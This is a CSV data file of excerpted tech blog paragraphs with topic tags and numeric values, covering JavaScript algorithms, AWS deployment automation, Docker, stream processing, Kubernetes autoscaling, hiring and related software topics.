1398,"The cleanest algorithm usually takes advantage of standard objects inherent in the language. Arguably the most important in computer science is Arrays. In Java Script, no other object has more utility methods than arrays. Array methods worth remembering are: sort, reverse, slice, and splice. Array elements are inserted beginning at the 0th index. This means the last element is at array.length1. Arrays are the most optimal for indexing (pushing), but can be terrible at inserting, deleting (not popping), and searching. In Java Script, arrays can grow dynamically.","['JavaScript', 'Algorithms', 'Big O Notation', 'Technical Interview', 'Front End Development']",3
1399,"Intimately associated with Arrays is iterating through them using loops. In Java Script, we can use five different control structures for iterations. The most customizable is the for loop, which we can use to iterate through array indexes in almost any order. If the number of iterations cannot be determined, we can use while and do while loops until a certain condition is met. For any object, we can use the for in and for of loops to iterate through its keys and values, respectively. To get both simultaneously, we can loop through its entries(). We can also break out of a loop at any time using a break statement, or skip ahead to the next iteration using a continue statement. For the most control, iterating through generator functions is the best.","['JavaScript', 'Algorithms', 'Big O Notation', 'Technical Interview', 'Front End Development']",3
1400,"Examples of these Array methods in code: In a seminal paper, the Church-Turing Thesis proves that any iterative function can be reproduced with a recursive one, and vice versa. Sometimes, a recursive approach is cleaner, clearer, and more elegant. Take this iterative factorial function for example: Expressed as a recursive function, only one line of code is needed! All recursive functions share a common pattern. They are made from creating a recursive part that calls itself, and a base case that does not. Whenever a function calls itself, it pushes a new execution context to the execution stack. This continues until the base case is met, then the stack unwinds as contexts are popped off one by one. For this reason, careless dependence on recursion can lead to the dreaded stack overflow runtime error.","['JavaScript', 'Algorithms', 'Big O Notation', 'Technical Interview', 'Front End Development']",3
1401,"Analysis: If we know the trick, the solution is trivial. That trick is to realize we can simply use the built-in reverse method for an array. First, we use the split method on a string to generate an array of characters, then we can apply the reverse method before using the join method to combine the characters back into a string again. This solution can be written in just one line of code! Though not as elegant, the problem can also be solved using the latest syntax and helper method. With the new for of loop that iterates through every character of any string, we can show off our familiarity with the latest syntax. Alternatively, we can also use the arrays reduce method which eliminates the need to keep a temporary variable.","['JavaScript', 'Algorithms', 'Big O Notation', 'Technical Interview', 'Front End Development']",3
1402,"Analysis: The key insight here is to realize that we can build on what wed learned from the previous problem. Except, we need to return a boolean value. This is as simple as returning a triple equality check against the original string. We could also use the new every method on an array to check that the first and last characters match up in sequential order towards the center. However, this will check two times more than necessary. Similar to the previous problem, the runtime complexities for both time and space are identical.","['JavaScript', 'Algorithms', 'Big O Notation', 'Technical Interview', 'Front End Development']",3
1403,"Analysis: One approach is to loop through every character, and when the previous character is a space, apply to Upper Case to capitalize the current character. Because string literals are immutable in Java Script, we will need to rebuild the input string with the appropriate capitalizations. This approach requires us to always capitalize the first character. Perhaps a cleaner approach is to split the input string into an array of words. Then, we can loop through this array and capitalize the first characters, before joining the words back together again. For the same reason of immutability, we will need to hold in memory a temporary array that contains the appropriate capitalizations.","['JavaScript', 'Algorithms', 'Big O Notation', 'Technical Interview', 'Front End Development']",3
1404,"Analysis: Firstly, we will need to create an array of alphabet characters in order to calculate the result of shifting a character. This means we need to lowercase the input string before iterating through its characters. We should use a regular for loop to easily keep track of the current index. We will need to build up a new string that contains the shifted characters per iteration. When we meet a non-alphabetic character, we should immediately append it to the end of our solution string and use the continue statement to skip ahead to the next iteration. The key insight is to realize that we can use the modulus operator to mimic the behavior of wrapping around to the beginning or end of the alphabet array when the shifting is more than 26. Lastly, we need to check for capitalization in the original string before appending the result to our solution.","['JavaScript', 'Algorithms', 'Big O Notation', 'Technical Interview', 'Front End Development']",3
1405,"Analysis: Many linked list functionalities are predicated on having a definite ending node. Therefore, ensuring that its not circular is critical. Again, the trick is to traverse the list two times, one of which is two times faster. If the list is circular, eventually, the faster one will loop around and coincide with the slower one. We can exit the loop here and return true. Otherwise, the end will be reached, and we can return false.","['JavaScript', 'Algorithms', 'Big O Notation', 'Technical Interview', 'Front End Development']",3
1406,"In modern web development, functions lie at the heart of the web experience. Data structures enter and exit functions while algorithms dictate the internal mechanics. The way a data structure scales is described by its space complexity, while the way an algorithm scales is described by its time complexity. In practice, runtime complexities are expressed as Big-O notations which help engineers to compare and contrast all the solution possibilities. The most efficient runtime is constant and does not depend on input sizes; the most inefficient requires exponential operations and memories. To truly master algorithms and data structures is to be able to reason linearly and systemically in parallel.","['JavaScript', 'Algorithms', 'Big O Notation', 'Technical Interview', 'Front End Development']",14
1407,"Theoretically, every problem has both an iterative solution and a recursive one. An iterative approach starts from the bottom and dynamically arrives at a solution. A recursive approach starts from the top by recognizing overlapping subproblems. Usually, a recursive solution is more expressive and simpler to implement, but an iterative solution is easier to grok and requires less memory. With first-class functions and control-flow constructs, Java Script natively supports both approaches. Generally, space efficiency needs to be sacrificed for performance gains, or time efficiency needs to be sacrificed for less memory usage. The right balance depends on the context and the environment. Thankfully, most interviewers are more concerned with the calculus than the outcome.","['JavaScript', 'Algorithms', 'Big O Notation', 'Technical Interview', 'Front End Development']",9
1408,"To really impress your interviewer, expand her purview by looking ahead and above for opportunities to utilize architectures and design patterns that increase reusability and maintainability. If youre seeking a senior position, knowledge of fundamentals and first principles, and experience with system-level design are equally important. Nevertheless, the best companies also assess for cultural fit. Because no one is perfect, the right team is essential. More importantly, some things in this world are impossible to achieve alone. More often than not, the things we create together and for each other are the most satisfying and meaningful.","['JavaScript', 'Algorithms', 'Big O Notation', 'Technical Interview', 'Front End Development']",0
1409,"Low-latency, internet-independent applications that can reliably run our business High availability for these applications Platform that enables rapid innovation and that allows delivery of business functionality to production as quickly as possible Horizontal scaleinfrastructure and application development teams Chick-fil-A is a very successful company in large part because of our fantastic food and customer serviceboth the result of the great people that operate and work in our restaurants. They are unmatched in the industry. The result is very busy restaurants. If you have been to a Chick-fil-A restaurant, this is not news to you. If you have not been, its time to go! While we are very grateful for our successes, they have created a lot of capacity challenges for us as a business. To put it in perspective, we do more sales in six days a week than our competitors do in seven (we are closed on Sunday). Many of our restaurants are doing greater than three times the volume that they were initially designed for. These are great problems to have, but they create some extremely difficult challenges related to scale.","['Docker', 'Kubernetes', 'Edge Compute', 'Edge', 'IoT']",6
1410,Why an email as well as Slack? Well because Slack is updated right now when the correct process is followed through automation. The Lambda function is triggered on ANY change in S3 so if someone tries to (later on in life) update S3 directly there is a notification sent out on that as well. People like to circumvent automation when they think they can do it faster and better. But I am a process guy as well. So I want to know on any change. That is why I am using AWS Lambda.,"['AWS', 'Codeship', 'S3', 'Cloudfront', 'Github']",10
1411,"I setup the S3 bucket and Cloud Front next to ensure the website was working correctly. Then I did the automation of keeping it updated so I can do one thing and trigger every single other thing the way it should be. Automation in any SDLC is our thing so I better be dogfooding this right?! This is what we did to automate our website updates with proper configuration management and a defined process. You can do it this way or maybe a similar way (Git Lab or Bitbucket, AWS internal tools for automation, Jenkins, Travis CI, etc.). I just decided this way as it was simple and worked.","['AWS', 'Codeship', 'S3', 'Cloudfront', 'Github']",18
1412,"You can do this with any hosted git repository really. I have used Git Hub and like it so I put my corporate stuff there. I pay for the account so I am using a private repo for the website code. I am also using a private repo for the lambda emailer code as well. When you have an account you can setup your repo and put your files in it. You can decide to use whatever branching strategy you wish. I have a master branch that is the source of truth for the website files myself. And I trigger off a change to that master branch to make this automation happen. What I found out is that with Code Ship if I put all the files in the root of my repo, when I later on copy all files to S3 it includes the .git folder because I give a root relative path. So what I did is make a wwwroot path in my repo and put all the files in there. Then I use that wwwroot path in my configuration (shown later) so only the website files get copied.","['AWS', 'Codeship', 'S3', 'Cloudfront', 'Github']",18
1413,"So now that your repo is setup and your integration user is setup in AWS with least privilege, sign up or log into Cloudbees Code Ship (there is a free tier) so you can create a new project. Choose Git Hub, Bitbucket or Git Lab as a Saa S setup or a self hosted setup. If you do not see one you use you can contact their support engineers on the page as well. For this I am using Git Hub. If you have not yet done so, install the Code Ship Git Hub app and follow the directions to link your corporate or personal Git Hub account to Code Ship. Once done you can select your Git Hub organization and the repository you wish to link.","['AWS', 'Codeship', 'S3', 'Cloudfront', 'Github']",7
1414,"Click the Connect button and then choose Basic unless you wish to pay for Pro. I would suggest get started with Basic and when you want more control or specifics bump up to Pro. The typical Open Core type of model IMO. Once you select the Basic button you see your Code Ship project settings. You can specify tests, branches, environment, notifications, as well as the repository settings. I specified the pipeline in Code Ship Deploy settings to run when Branch is exactly for master so it only runs for the master branch. Set this to however you wish to use your automation. There is not a wrong choice however over time you will see some best practices bubble up for you and your group.","['AWS', 'Codeship', 'S3', 'Cloudfront', 'Github']",18
1415,"I also setup my S3 interaction to copy files from the wwwroot Git Hub master branch into my S3 bucket name by using the access key and secret access key mentioned above in my deploy settings for S3. The Local Path is the path within my repo I talked on earlier and if you do not, you may get the .git folder copied in there without some other settings or specifications. Making it go into its own folder was simple and worked for me so that is what I did (KISS method). The S3 bucket in this form is just the name that is listed when you list all our S3 buckets. The regular name, not the full URL or the ARN. Just the simple name in your S3 listing.","['AWS', 'Codeship', 'S3', 'Cloudfront', 'Github']",7
1416,"The other thing I did on the Notifications tab of Code Ship is make it link into my Slack channel. On the Code Ship Notifications tab in project settings you can specify to add a New Notification and choose the Slack option. Follow the settings in there to approve and apply the integration and specify what Branch, Build events, and other information you wish. The Webhook URL in the Slack setup will need to be copied into your Code Ship settings when done. I choose a #website channel in my slack setup so it is separate from the rest of the things in here like #twitter, #work-schedule, #github-notifications, etc. Do what you want here just get it setup how you wish.","['AWS', 'Codeship', 'S3', 'Cloudfront', 'Github']",7
1417,"When this is done you will see notifications in your Slack channel like below just letting you know when things happen. This may not be a big deal if you are a company of 1 to 5 people. When you get to delegating with 25+ people it is easier to notify like this and keep things separate so you can keep it straight! If that is all you want, save your Code Ship project settings and go test it out! Edit locally your website code and do a push and a PR or (just for testing purposes!!!) edit locally in Git Hub to a file and then commit it with a good comment. Let this rip and see what you get! If something does not work the Slack info as well as Code Ship logs and AWS should show you information you can trace. Otherwise you are good to go! This is not super complex but it does have some moving parts. The great news is, once it is setup and working you can trust your automation! If like me you wanted a bit more interaction, you also can setup an AWS Lambda function that is triggered on any S3 change to send you an email. If you do not want to do that, you are done! Or you can just read below to get a feel for how Lambda can work for you.","['AWS', 'Codeship', 'S3', 'Cloudfront', 'Github']",18
1418,"Ok if you want to setup a Lambda function there are a few more things to do. One is to setup a local directory on your box for Node JS. If you do not have Node JS go install it or read this and change for your favorite Lambda language (Go, C#, etc.). Go into the directory and run npm i nodemailer as we use that module. Now create an __url__ file and make it like below. I did not want to copy the text in here. I want to make you get used to making these and understand how they work.","['AWS', 'Codeship', 'S3', 'Cloudfront', 'Github']",15
1419,"When you have this setup and working locally, similar to how I did it, you need to go into the folder on your machine and zip up the contents. DO NOT zip up the folder. Go into the folder and zip up the contents or this wont work! Specify the Runtime as N __url__ 8.10 and the Handler as index.handler.","['AWS', 'Codeship', 'S3', 'Cloudfront', 'Github']",7
1420,"You will need to specify the trigger (event) that kicks this off and choose S3. Find your S3 website folder we used earlier for your code that you wish to trigger off and specify the events you wish to use (create, put, delete, etc.) And there are a few resources you need in this Lambda function that I used: Amazon S3Full Access, Amazon SESFull Access, and Cloud Watch Logs Full Access. I also may use the SNS if I want to get notifications on this Lambda function just in case it does not work. And you can test out and restrict the access and permissions to tweak this for least privileged user as well. I suggest you do that to #1 tighten down security but #2 to learn how to do it in AWS.","['AWS', 'Codeship', 'S3', 'Cloudfront', 'Github']",7
1421,You can test this by using a test sample payload. This page in AWS Lambda docs is very helpful. Go to To test the Lambda function and see the payload. You can save this and test your function to see the logs as well as the email response once your SES is setup correctly. Pretty cool stuff when you see this working! I breezed through this step and I assure you it took me several hours over a few days to get it working the way I wanted it to. I will probably go back and revisit this but for now it is working and good enough to share.,"['AWS', 'Codeship', 'S3', 'Cloudfront', 'Github']",7
1422,"Because I was so dirt poor, because I was hungry for money idolizing it and dreaming about having it. I was absolutely willing to play the game that was on the field. to quote a passage from Brotopia. I saw the strange parties going on ( although I was only on the fringes and I didnt participate in any of that stuff, and never felt that I needed to ), I went to the early stages of some of these, then left when stuff got odd. I would see things, that could be considered abuse of power, etc I kept it to myself, I wasnt being a good ally. I justified it by telling myself that since I had been so deeply and consistently oppressed that I wouldnt do anything to jeopardize the opportunity I had to finally see how far my intelligence and hard-work would take me.","['Tech', 'Culture', 'Equality', 'Silicon Valley', 'Biography']",4
1423,"If youve spent any time in the Dev Ops realm, youve probably heard of Docker, and youve definitely heard of containers. If youre just starting out in Dev Ops or want to know what Docker is and how containers work, then please allow me to enlighten you! Im a Dev Ops engineer and a Docker enthusiast that has been using Docker for about five years to build everything from small containerized utilities to production quality containers. And I love talking about Docker. Lets start at the beginning Its impossible to talk about Docker without a higher level understanding of what a container is. A container (in this context) is an isolated user-space instance. Usually this isolation is both from the host computers file system and from its networking, meaning that by default, any processes that run in the container do not have direct access to the host computers resources. The result is that if you are interacting with a shell that is running inside a container, you will not (again, by default) have access to any of the executables on the host system.","['Docker', 'DevOps', 'Devops Tool', 'Devops Tutorial', 'Devops Practice']",7
1424,"For comparison, lets take the example of a refrigerator. The refrigerator runs constantly and maintains a given air temperature and humidity inside. Now, say you want to store some leftovers in the refrigerator. You place those leftovers in a plastic container and place that container in the refrigerator. The container isolates the leftovers from the rest of the items in the refrigerator and isolates the rest of the refrigerator from the container. The container does not have any mechanism for cooling the leftovers, it re-uses the cooling resources of the refrigerator. Now say you leave the container in the refrigerator too long and mold manages to get into the container. The container is now protecting the rest of the items in the refrigerator from the mold, ensuring that all the food in the refrigerator is not spoiled simply because one item went bad.","['Docker', 'DevOps', 'Devops Tool', 'Devops Tutorial', 'Devops Practice']",5
1425,"If youre thinking that this sounds a lot like virtualizationthat is, running a Virtual Machine (VM) inside a host operating systemthen you are correct. Docker has a lot in common with Virtual Machines, at least on the surface. The advantage of containers in general, and Docker specifically, is system resource usage. As described in the refrigerator example above, a container reuses certain parts and services of the host OS that can be shared. Whereas a VM has to run a complete builds of any given guest OSfrom kernel to user interface, bringing with it all of the disk and memory overhead that the guest OS introduces. This allows Docker containers to start much faster than a VM and causes them to use significantly fewer system resources.","['Docker', 'DevOps', 'Devops Tool', 'Devops Tutorial', 'Devops Practice']",7
1426,"Traditionally you install your web server of choice using your operating systems package manager. This will install the web server executable, plus lots of other files, libraries, and other requirements to run that web server software, plus maybe some management utilities and/or plugins. Fast forward about six months when an upgrade is available for the web server. You install that upgrade via the package manager. Then you find that the new web server version breaks your website. So you roll it back, but in order to do that you have to uninstall the currently installed version of the web server. You can remove it, again using the OS package management tools, but more than likely youll leave residual files and libraries all over your disk, not to mention the potential for data loss.","['Docker', 'DevOps', 'Devops Tool', 'Devops Tutorial', 'Devops Practice']",18
1427,"With Docker, the installation and removal process are quite different. Almost all of the major web servers are available as official Docker images from Docker Hub. You simply pull a Docker image of whatever web server you would like to run to your local host (e.g. docker image pull nginx:latest), run it, and now you have a web server. When you need to upgrade, you simply pull the latest build, remove the old web server container, and start up the new one. Just revert back to the older image. When you no longer need to run a web server on this host, simply remove the image (e.g. There is nothing to uninstall because all of the web server executables were inside the Docker image, and your system does not have any extra libraries or other files strewn about the filesystem.","['Docker', 'DevOps', 'Devops Tool', 'Devops Tutorial', 'Devops Practice']",7
1428,"To Stop the container: Now if you try to access http://localhost:80, the browser will timeout. That said, the Docker container is not actually gone, weve only stopped it. Execute the container list command again: You should only get the header row back, meaning there are no running containers. Now execute this command: The -a switch tells Docker to show you all containers, running and stopped. You should see your Nginx container, but under status it should say something like Exited (0) About a minute ago. Lets get rid of that container forever.","['Docker', 'DevOps', 'Devops Tool', 'Devops Tutorial', 'Devops Practice']",7
1429,"Stateful: Processing of an incoming record depends upon the result of previously processed records. So we need to maintain an intermediate information between processing of different records. Every incoming record, during processing, may read and update this information. This intermediate information is called State in Stateful Processing. Operations like aggregating count of records per distinct key, deduplicating records, etc are examples of Stateful Processing.","['Big Data', 'Streaming Analytics', 'Spark Streaming', 'Rocksdb', 'Stream Processing']",8
1430,"In old Spark Streaming, State Management was quite inefficient due to which it was not fit for Stateful processing. It was because of 2 major limitations in its design: In every micro-batch, the state was persisted along with the checkpoint metadata (i.e. This was done at the end of each and every micro-batch even when there was no change in the state at all. Moreover, there was no provision of incremental persistence of state data. Every time, the snapshot of entire state was unnecessarily serialized and saved to store/file system (instead of only the part of state that changed in the micro-batch).","['Big Data', 'Streaming Analytics', 'Spark Streaming', 'Rocksdb', 'Stream Processing']",10
1431,"Also, for a partition in a micro-batch, there is a dedicated file for recording changes made in the micro-batch in fault tolerant way. This file is called versioned delta file. It contains only the state changes in the particular batch for the associated partition only. So there are as many delta file as many partitions per batch. It is created at this unique path: checkpoint Location/state/operator Id/partition Id/${version}.delta Task for a partition is scheduled on the executor where the Hash Map for the same partition from previous micro Batch is present. This is decided by the driver which keeps sufficient info about the state stores on executors.","['Big Data', 'Streaming Analytics', 'Spark Streaming', 'Rocksdb', 'Stream Processing']",3
1432,"Flink on the other hand, uses its unique snapshot strategy for fault-tolerance, instead of depending on some external system like Kafka. Time to time Flink takes snapshot of Rocks DB database and copy to reliable file system like HDFS. In case of failure, Rocks DB is restored from the latest snapshot. There will be some data between the time of last snapshot and the time of failure, for which state was not persisted in snapshot. In order to recover for that, the processing of the tasks in Flink operator resumes from the point of the snapshot to guarantee the unaccounted data is reprocessed. It is important to keep in mind that this is possible only in case of replay-able data sources like Kafka, Kinesis, etc where we can go back in time to restart processing from a previous offset.","['Big Data', 'Streaming Analytics', 'Spark Streaming', 'Rocksdb', 'Stream Processing']",8
1433,"The first doctors eyes sparkle with intelligence and enthusiasm. I consider myself a medical artist!, he exclaims. All of my procedures are truly one of a kind. I love going to work every day and expressing my unique vision in my work! We have a saying in my office thats almost a manifesto: Strive for practitioner happiness! The second doctor is steady if aloof. Well, my dad was a pipefitter, she explains. You apply the tools and skills to solve physical problems as best you can. I guess some people might think its boring to solve the same problems over and over. But so far I havent gotten tired of just putting my head down and seeing the results it has in my patients lives.","['Software Development', 'Programing', 'Skilled Trades']",4
1434,"In the realm of trade, the goal is to meet practical needs and solve practical problems. The aesthetic impacts of a machine, a road, or a power transformer matter as far as their practical impact on the wellbeing of the environment and its inhabitants but are not an end unto themselves. In no circumstance is the goal to express the unique character of the tradesperson. On the contrary, the creations of a master tradesperson leave no particular trace of their creator. If a real estate developer extolled the visionary nonconformism of the plumbing system of a proposed hospital expansion, investors and executives would appropriately end the conversation then and there.","['Software Development', 'Programing', 'Skilled Trades']",12
1435,"Software development is a trademost of the time I consider software development as the direct digital equivalent of machine building. Most of the software in the world, like most of the physical machinery, exists outside of public or consumer awareness. Even consumer devicesfrom fancy smartphones to cheap blendersare mostly built from parts that are not visible to the user. In both the digital and physical cases, building these machines is straight engineering and trade work. Utility is the only meaningful measure, with the caveats noted above about environmental impact. When side effects (externalities to use the formal term) are included in the consideration of utility, there are no caveats.","['Software Development', 'Programing', 'Skilled Trades']",16
1436,"And yet well-built software, like a well-built machine or well-built building, intentionally separates the foundation of pure trade work from the surface of craft and design as much as possible. Its a general foundational principle to design systems of all kinds to have minimal dependencies between components. This is just as true for minimizing the dependencies between UI or design features and the bulk implementation of the logic, storage, and processing that the UI is built against. The demands of design and craft in software visuals are real and important, and they should be segregated to the greatest extent possible from the functional implementation. Mixing roles and working against specialized skill sets is a great way to squander human resources. Architects are neither engineers nor electricians and vice versa. The rare individual who has all these skills does not remove the need to keep the roles and implementations separate.","['Software Development', 'Programing', 'Skilled Trades']",12
1437,"Skilled trades, software development (and medicine) included, are full of opportunities for creativity, problem-solving, intellectual challenges. Likewise, there is endless opportunity for innovation, but it should be measured very differently from innovation in art. A key distinction is in the ease of imitation. The most profound accomplishments in the art are precisely so because they are so difficult or even impossible to imitate. Their singularity is part of their value. They continue to surprise even on repeat viewing. It is the exact opposite in trades. The most profound accomplishments in technologies and trades are valuable precisely because they can be readily understood and copied by even mediocre tradespeople in the same field. They seem somehow obvious on the first encounter, and only more so with increasing familiarity.","['Software Development', 'Programing', 'Skilled Trades']",12
1438,"It is totally reasonable for all humans, including software developers, to want to have good working conditions, to feel engaged and fulfilled in their work. Tradespeople derive this satisfaction from working with high-quality tools, on well-managed projects, building things worth building. They express creativity in coming up with apt solutions to the infinite variations in requirements and problems encountered. They also enjoy the rhythm of simply executing, where there are things to be built but nothing to be invented. People who find this boring, who are more motivated by a desire for individual expression than by anonymous contribution, who take more pleasure in compounding complexity than striving for simplicity, who yearn for subtlety and cleverness over obviousnessthese people are not suited for software development. The world would be a poorer place in every sense without these personalities contributions to arts, politics, and other endeavors that even require a level of narcissism and singularity to succeed and contribute. Software development is not one of those endeavors.~Josh, Software Developer.","['Software Development', 'Programing', 'Skilled Trades']",12
1439,"Windows is a large proportion of the worlds first choice of operating system. Its reputable, and its reliable (ish), and its what the guy at Currys/PC World recommends, so it must be the best, right? Well, perhaps it used to be. But over time Ive been slowly disenchanted by Microsoft. I was one of the many that thought that Windows is the best thing around. But, as Windows started collecting data, I started to realize that the guy at Currys might be wrong. Or getting commission on what they sell.","['Linux', 'Windows', 'Macos', 'Microsoft', 'Apple']",16
1440,"The only problem with Linux, the only reason it sucks, is because of the guy working at Currys. You see, hes there to try and get as much money as possible out of you. Some of it is obvious: the endless extended warranties and insurance that they offer you and you never use is just one example. But some of it is not so obvious. They dont offer Linux as a choice, because they cant profit off something thats free. So the non-techie people probably arent aware that it is an option.","['Linux', 'Windows', 'Macos', 'Microsoft', 'Apple']",16
1441,How can we make Linux suck less? We make people aware its an option. And we tell them that its not as hard as they might think.,"['Linux', 'Windows', 'Macos', 'Microsoft', 'Apple']",16
1442,"I try to run an organization that is passionate but not emotional. That means that we dont take things personally. If I say something that may be not in favor of what youre thinking, Im not making a judgment about you. Im making a judgment about your idea. And if you understand the difference, then we will get along just fine. If youre not self-aware, then making that distinction between emotions and passions becomes impossible.","['Startup', 'Software Development', 'DevOps', 'Recruiting Engineers']",4
1443,"There was one case which is funny. There was this fellow, very nice, very knowledgeable, very intelligent, but he had only worked at governmental organizations, and with very lax schedules. So I didnt want to hire the guy. I told him, I dont think that youre going to be able to do the kinds of things that we want you to do. And he looked at me and said, Youre wrong. And my whole team, they said to me, If you dont hire this guy, we will all quit. As it turns out, he was one of my best hires ever.","['Startup', 'Software Development', 'DevOps', 'Recruiting Engineers']",0
1444,"That transparency remains throughout your tenure with me. I was running a company a few years ago, and we started running into money troubles. We didnt know if we were going to have money to pay salaries. I told my people, Look, this is whats going on. If you need to quit because you have to feed your family, I understand. And when the time came to shut the doors, I said, Look, let me help you find a job. Some of them came with me to my new company because they could go for a couple months without a paycheck until I could get funding. Some of the other people I placed with friends of mine who had their own companies. Everybody knows my hiring practices, so people always say, If youre shutting down a company and you have people, send them my way.","['Startup', 'Software Development', 'DevOps', 'Recruiting Engineers']",0
1445,"It is no secret that the inner class debates have been responsible for one too many flame wars in the distant, not-to-forgotten past. And if it is a secret, its no question one of the worlds worst hidden. Indubitably, there are many who are frowning at you for needing an exact reference to an anonymous inner class in the first place as the idea is to avoid adding any cruft to the class. Rather, they should be used to fulfill a contract on the fly, typically to facilitate for an operation logically linked to another class, such as is the common case with event handling. However, curiosity probably didnt actually kill the cat and Im willing to bet most developers are curious. Perhaps, to the detriment of our sanity! With a bit of reflection magic, we can achieve a similar effect in Pre-Java 10 code as follows:.","['Technology', 'Tech', 'Software Development', 'Java', 'Programming']",9
1446,"Note that Kubernetes algorithm is not a pure proportional autoscaler but incorporates several tweaks to improve performance. For example, it has a tolerance setting which prevents autoscaling events below a certain size; some pods, like those still initialising, are ignored for the purposes of the algorithm; a limit is applied to the size of scale-up events; and the algorithm is run several times within a window in order to reach a final figure (more details here). In addition, because Kubernetes allows you to configure custom metrics, it is possible to elicit more complicated responses by feeding the autoscaler metrics which already have a layer of processing embedded within them. You can even write your own custom controller, perhaps integrating one of the refinements below: A proportional-integral autoscaler Proportional droop can be remedied in a less ad-hoc fashion by the addition of an integral term to the autoscaling algorithm. Our formula would become something like: That last term is the integral term, calculated by repeatedly adding up (say, every 10 seconds) the amount by which the cluster is off its target. Consider again the example of constantly increasing demand. The longer that demand has been rising, the longer the proportional term has been failing to keep up with it, and so the greater the sum of the error becomes. The integral term thus neutralises the proportional droop given enough time.","['Docker', 'Kubernetes']",11
1447,"A proportional-integral-derivative autoscaler Because proportional-integral control still needs a certain amount of time for the integral term to accumulate, it is not always responsive enough. For applications that need extremely fast responses, a derivative term can be added. This term modifies the scaling event magnitude by an amount proportional to the rate at which the target metric is changing. It thus incorporates a predictive component into the autoscaling algorithm. If demand is increasing more rapidly than usual, the scaling event will be correspondingly larger. Because controllers incorporating a derivative term are predictive, they have a much greater sensitivity to noise: a very steep fluctuation, even if it is very short lived, could trigger a large scaling event.","['Docker', 'Kubernetes']",5
1448,"Other forms of control PID control is an old and relatively simple form of control, but there is a lot more to explore. Predictive autoscalers which make use of machine learning are likely to become more important in the near future. AI-powered predictive autoscaling is in use at Netflix (Scryer) and now available on AWS. To get a sense of the range of options, cast your eyes over this list from The Art of Capacity Planning: Scaling Web Resources in the Cloud: Dev Ops is not just automation; rather, it is a culture that is developed within an organisation as a whole when it places emphasis on reducing lag and eliminating noise in the feedback loop between developers and customers. Dev Ops in this sense overlaps with what we mean by a culture of learning, as described by YLDs CEO, Nuno Job. The necessity of the culture of learning derives from the fact that customer requirements are no more static than the typical load on a cluster. They are, in the cybernetic view, momentary samples of an oscillatory control loop whose operating principles (target and algorithm) can only be uncovered gradually through long term empirical research. That is why customer requirements can only be effectively tracked and predicted if infrastructure is flexible and reliable enough to repeatedly submit experiments to the market with minimal overhead. Helping clients get to that point is a large part of what we do at YLD.","['Docker', 'Kubernetes']",6
1449,"Not long after the publication of Wieners book, his ideas were adopted within the field of management consultancy by, among others, the British consultant Stafford Beer. Beer developed a model of how an organisation could function as what he called a viable system (read: adaptive, homeostatic system): at the core of the model is a set of feedback loops monitoring and correcting mistakes at every level of the business. Beers focus is on the internal dynamics of organisations. The feedback loop between the customer and the business receives relatively little emphasis in his model. The capacity for customer monitoring unleashed by the Internet was not yet a reality. Today, the cybernetic vision of Wiener in which fully autonomous systems adapt and grow, fertilised by the data of billions of interactions, is upon us.","['Docker', 'Kubernetes']",5
1450,"There is of course another and darker aspect of the cybernetic identity of customer and computer, one which concerned Wiener greatly: If users wish to reap the full benefit of autonomous systems, they need to submit to them on the terms of those systems, yielding their data for consumption in a form that the systems can understand. They need to be willing to become part of a control loopto become automatons themselves! The genealogy of cybernetics makes this danger clear. The lens cybernetics places on human behaviour is the lens of the gunner, implacable and detached. Here is Wiener, as quoted in The Ontology of the Enemy: Norbert Wiener and the Cybernetic Vision, reflecting on the realisation that enabled him to construct a gun able to track the apparently random motions of pilots: This realisation, in which the feedback loop from organism-machine to machine-organism was closed for the first timein order to shoot down enemy planesis the founding moment of cybernetics. The danger of objectifying the customer and, worse, turning him or her into a target, is one reason that a purely metrics-driven approach to business operations and product design will never be enough. Conversion, clickthrough and likes tell a human story from a machines perspective. There must be a place for empathy and imagination in the control loop.","['Docker', 'Kubernetes']",5
1451,"The extent to which cybernetics penetrated intellectual culture internationally through the 50s, 60s and 70s can hardly be overstated. The discipline was developed and disseminated through a series of conferences (the Macy conferences) and nurtured at dedicated institutions like the Biological Computation Lab at the University of Illinois. It ended up exerting a profound influence on figures as diverse as the French psychoanalyst Jacques Lacan and the Chilean president Salvador Allende, who, in a high point for the discipline, hired Stafford Beer to organise the Chilean economy. Traces of this craze are still with us in the prevalence of the word cyber to denote anything to do with computers, although the word means not computation, but control. By and large, however, the discipline has faded into obscurity. While the interdisciplinary nature of cybernetics was undoubtedly part of the reason for its initial popularity, it became an ingredient in its downfall, as its sub-disciplines fractured and splintered or evaporated into generalities. Funding for cybernetic research groups started to flag significantly in the 70s, around the time that ARPANET and the first personal computers were being developed. Suddenly, much of what cyberneticians had been discussing in theoretical terms was becoming a reality, and so attention passed from theory back to engineering. It has disappeared into the technologies that we use and the practices we follow on a day-to-day basis, whether we realise it or not.","['Docker', 'Kubernetes']",5
1452,"Rules could be configured to check for the sender address, the receivers addresses, keywords on the subject and/or body, if it has attachments and others They can even be stacked together, meaning that a message would only be imported if it passes all the rules defined for that Bucket. Calm down It looks a lot more complicated than it really is. Heres the validator method, for clarification: Following the same logic, actions, which are also defined through the UI, configures the work to be done, by the Process Emails Buckets class, after importing a message, successfully. Actions could be one of the follow: marking a message as read/imported, move a message to another mailbox, and delete the message from the source. This will ensure that the source would stay organized and optimized for the next run. Heres how I implemented this: Another little nuance I needed to handle was extracting text from PDFs. So, if the Process Email Buckets Job class detected a PDF file/attachment, not only would it download and archive it, but it should dispatch another job class, called Scan Pdf Attachments.","['Laravel', 'Software Engineering', 'PHP']",15
1453,"And all of this was made in about two weeks, thanks to the Laravel framework, which allowed me to abstract common needs and focus on my main problem. Thank you very much for reading this! As you may notice, Ive not revealed many of the technical details, nor have I revealed several other parts of the system. I have a very strict contract with my current employer that doesnt allow me to show you all the bits and pieces behind this project. If you got disappointed by that, Im really sorry What I wanted to show you, however, was my process of thinking, tools chosen and the reasons behind my decisions. Everyone can make the same, or even better, solution on other languages and/or frameworks. The interesting, and the hard, part is the process of thinking, the ability to break down a big problem into smaller ones and not losing focus on the main goal.","['Laravel', 'Software Engineering', 'PHP']",19
1454,"1 and Fig.2 show the ping RTTs (in ms) between different Google cloud and Amazon AWS regions respectively. The names of the regions are shown on the x- and y-axes. The darker the shade of the heat-map entry, the better (lesser) the RTT. The absolute values of the RTTs are also noted on the heat-map. The ping RTT from a region to all other regions can be read off the heat-map by looking at its row and and the corresponding destination region column.","['Cloud Computing', 'AWS', 'Google Cloud Platform', 'Azure']",14
